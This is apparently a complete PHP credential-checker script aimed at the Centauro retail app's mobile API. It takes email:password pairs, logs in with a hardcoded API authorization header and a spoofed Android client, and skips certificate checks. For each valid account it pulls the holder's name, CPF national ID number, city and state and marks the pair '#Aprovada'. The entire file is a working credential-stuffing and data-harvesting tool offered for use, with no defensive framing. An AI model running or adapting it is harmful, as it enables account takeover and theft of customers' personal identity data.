<?php
error_reporting(0);
set_time_limit(0);
date_default_timezone_set('America/Sao_Paulo');

function inStr($string, $start, $end, $value)
{
    $str = explode($start, $string);
    $str = explode($end, $str[$value]);
    return $str[0];
}

function getStr($string, $start, $end)
{
    $str = explode($start, $string);
    $str = explode($end, $str[1]);
    return $str[0];
}

function multiexplode($delimiters, $string)
{
    $ready = str_replace($delimiters, $delimiters[0], $string);
    $launch = explode($delimiters[0], $ready);
    return $launch;
}

$lista = $_GET['lista'];
$explode = multiexplode(array(
    ";",
    "»",
    "|",
    ":",
    " ",
    "/"
) , $lista);
$explode = array_values(array_filter($explode));
@$email = trim($explode[0]);
@$senha = trim($explode[1]);

function __curl($url, $post = false, $header = false, $method = false)
{

    $ch = curl_init();
    curl_setopt($ch, CURLOPT_URL, $url);
    curl_setopt($ch, CURLOPT_HEADER, 1);
    if ($method)
    {
        curl_setopt($ch, CURLOPT_CUSTOMREQUEST, $method);
    }
    curl_setopt($ch, CURLOPT_ENCODING, "");
    curl_setopt($ch, CURLOPT_FOLLOWLOCATION, true);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    curl_setopt($ch, CURLOPT_COOKIESESSION, false);
    curl_setopt($ch, CURLOPT_COOKIEFILE, getcwd() . '/cookies/casasbahia.txt');
    curl_setopt($ch, CURLOPT_COOKIEJAR, getcwd() . '/cookies/casasbahia.txt');
    curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
    curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, false);
    if ($header)
    {
        curl_setopt($ch, CURLOPT_HTTPHEADER, $header);
    }
    if ($post)
    {
        curl_setopt($ch, CURLOPT_POST, true);
        curl_setopt($ch, CURLOPT_POSTFIELDS, $post);
    }
    $exec = curl_exec($ch);
    return $exec;
}
$post = strlen('{"usuario":"' . $email . '","senha":"' . $senha . '","ManterLogado":true}');

$d1 = __curl('https://api.centauro.appsbnet.com.br/v2.1/clientes/login', '{"usuario":"' . $email . '","senha":"' . $senha . '","ManterLogado":true}', array(
    "accept-encoding: gzip",
    "authorization: Basic TW9iaWxlQXBwTTpjN2I1OTJhNg==",
    "connection: Keep-Alive",
    "content-length: " . $post . "",
    "content-type: application/json; charset=UTF-8",
    "host: api.centauro.appsbnet.com.br",
    "user-agent: Centauro/1.8.1 (samsung greatlte; 4.4.2 API 19)",
    "x-client-useragent: android",
    "x-cv-id: 14"
) , 'POST');

$token = getStr($d1, '"token":"', '",');
$d2 = __curl('https://api.centauro.appsbnet.com.br/v3/clientes', false, array(
    "accept-encoding: gzip",
    "authorization: Basic TW9iaWxlQXBwTTpjN2I1OTJhNg==",
    "connection: Keep-Alive",
    "host: api.centauro.appsbnet.com.br",
    "user-agent: Centauro/1.8.1 (samsung greatlte; 4.4.2 API 19)",
    "x-client-token: " . $token . "",
    "x-client-useragent: android",
    "x-cv-id: 14"
));

$d3 = __curl('https://api.centauro.appsbnet.com.br/v2/endereco', false, array(
    "accept-encoding: gzip",
    "authorization: Basic TW9iaWxlQXBwTTpjN2I1OTJhNg==",
    "connection: Keep-Alive",
    "host: api.centauro.appsbnet.com.br",
    "user-agent: Centauro/1.8.1 (samsung greatlte; 4.4.2 API 19)",
    "x-client-token: " . $token . "",
    "x-client-useragent: android",
    "x-cv-id: 14"
));

$data = date("d/m/Y H:i:s");

if (strpos($d1, 'primeiroAcesso'))
{
    $n = getStr($d2, '"nome":"', '",');
    $sobrenome = getStr($d2, '"sobrenome":"', '",');
    $nome = "$n $sobrenome";
    $cpf = getStr($d2, '"cpf":"', '",');
    $cidade = getStr($d3, '"cidade":"', '",');
    $uf = getStr($d3, '"uf":"', '",');

    die('<font color="green" style="font-weight: bold;">#Aprovada</font> <font color="#D0D3D4">' . $lista . '| Nome: ' . $nome . ' | Cpf: ' . $cpf . ' | Cidade: ' . $cidade . ' | Estado: ' . $uf . '  </font> <font color="#333333"></font>');
}
else
{
    die('<font color="red" style="font-weight: #C0392B;">#Reprovada</font> ' . $lista . '  <font color="#333333"></font>');
}
?>
